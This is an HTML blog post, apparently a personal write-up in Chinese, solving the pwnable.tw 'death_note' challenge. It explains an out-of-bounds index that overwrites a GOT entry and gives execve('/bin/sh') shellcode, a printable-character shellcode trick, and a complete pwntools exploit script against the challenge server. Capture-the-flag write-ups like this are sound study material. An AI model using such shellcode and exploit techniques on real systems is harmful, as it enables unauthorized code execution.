@@ -1,0 +1,69 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>PWNABLE.TW-death_note-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题"><meta property="og:image" content><meta property="og:title" content="PWNABLE.TW-death_note-WP"><meta property="og:description" content="漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1204.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-20T17:05:37+00:00"><meta property="article:modified_time" content="2021-03-20T17:05:37+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PWNABLE.TW-death_note-WP"><meta name=twitter:description content="漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>PWNABLE.TW-death_note-WP</h1><div class=meta>Posted on Mar 20, 2021</div></div><section class=body><p>漏洞在于数组访问越界和堆栈可执行。在 <code>add_note</code> 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题对输入的 shellcode 进行了检查，每个字符都需要是可输出字符，这种题之前做过两道，都是使用工具自动生成的。因为我一直觉得 shellcode 这种东西挺没意思的，就一直没有深究到底该怎么写它，一直都是用工具生成，这道题就吃瘪了，把 shellcode 长度限制在了 80 中，现成的 shellcode 都无法使用。于是只能自己写</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>/* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
+</span></span><span style=display:flex><span>/* push &#39;/bin///sh\x00&#39; */   
+</span></span><span style=display:flex><span>push 0x68  
+</span></span><span style=display:flex><span>push 0x732f2f2f  
+</span></span><span style=display:flex><span>push 0x6e69622f  
+</span></span><span style=display:flex><span>mov ebx, esp   
+</span></span><span style=display:flex><span>/* push argument array [&#39;sh\x00&#39;] */   
+</span></span><span style=display:flex><span>/* push &#39;sh\x00\x00&#39; */  
+</span></span><span style=display:flex><span>push 0x1010101   
+</span></span><span style=display:flex><span>xor dword ptr [esp], 0x1016972   
+</span></span><span style=display:flex><span>xor ecx, ecx   
+</span></span><span style=display:flex><span>push ecx /* null terminate */  
+</span></span><span style=display:flex><span>push 4   
+</span></span><span style=display:flex><span>pop ecx  
+</span></span><span style=display:flex><span>add ecx, esp   
+</span></span><span style=display:flex><span>push ecx /* &#39;sh\x00&#39; */  
+</span></span><span style=display:flex><span>mov ecx, esp   
+</span></span><span style=display:flex><span>xor edx, edx   
+</span></span><span style=display:flex><span>/* call execve() */  
+</span></span><span style=display:flex><span>push 11 /* 0xb */  
+</span></span><span style=display:flex><span>pop eax  
+</span></span><span style=display:flex><span>int 0x80   
+</span></span></code></pre></div><p>这是 <code>shellcraft.sh()</code> 生成的 shellcode，主要是 <code>int 0x80</code> 比较麻烦，其对应的机器码为 <code>\xcd\x80</code>，不过在可输出字符下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sub byte ptr [eax… + 立即数], al dl…
+</span></span><span style=display:flex><span>sub byte ptr [eax… + 立即数], ah dh…
+</span></span><span style=display:flex><span>sub dword ptr [eax… + 立即数], esi edi
+</span></span><span style=display:flex><span>sub word ptr [eax… + 立即数], si di
+</span></span></code></pre></div><p>以上四个是可用的，而 puts 函数在跳转到 [got] 的时候，edx 指向的就是 [got]，也就是我们的 shellcode，我们通过多次 <code>sub byte ptr [eax… + offset]</code> 就可以把 <code>\xcd\x80</code> 从可输出字符减过来了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
+</span></span><span style=display:flex><span># coding=utf-8
+</span></span><span style=display:flex><span>from pwn import *
+</span></span><span style=display:flex><span>from LibcSearcher import *
+</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
+</span></span><span style=display:flex><span>context.arch = &#39;i386&#39;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh = remote(&#34;chall.pwnable.tw&#34;,10201)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode = &#39;push 0x68;&#39;
+</span></span><span style=display:flex><span>shellcode += &#34;push 0x732f2f2f;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push 0x6e69622f;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push esp;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;pop ebx;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push edx;pop eax;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push 0x55555555;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;pop edx;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;sub byte ptr [eax + 0x2C],dl;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;sub byte ptr [eax + 0x2C],dl;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;sub byte ptr [eax + 0x2D],dl;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;sub byte ptr [eax + 0x2D],dl;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push ecx;pop eax;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push ecx;pop edx;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;push ecx;pop esi;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;xor al,0x40;&#34;
+</span></span><span style=display:flex><span>shellcode += &#34;xor al,0x4b;&#34;
+</span></span><span style=display:flex><span>shellcode = asm(shellcode)
+</span></span><span style=display:flex><span>print &#34;len:&#34; + str(len(shellcode))
+</span></span><span style=display:flex><span>shellcode += &#39;\x77\x2A&#39;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;choice :&#34;,&#39;1&#39;)
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Index :&#34;,&#39;-&#39; + str((0x804A060 - 0x804A020) / 4))
+</span></span><span style=display:flex><span>sh.sendlineafter(&#34;Name :&#34;,shellcode)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh.interactive()
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
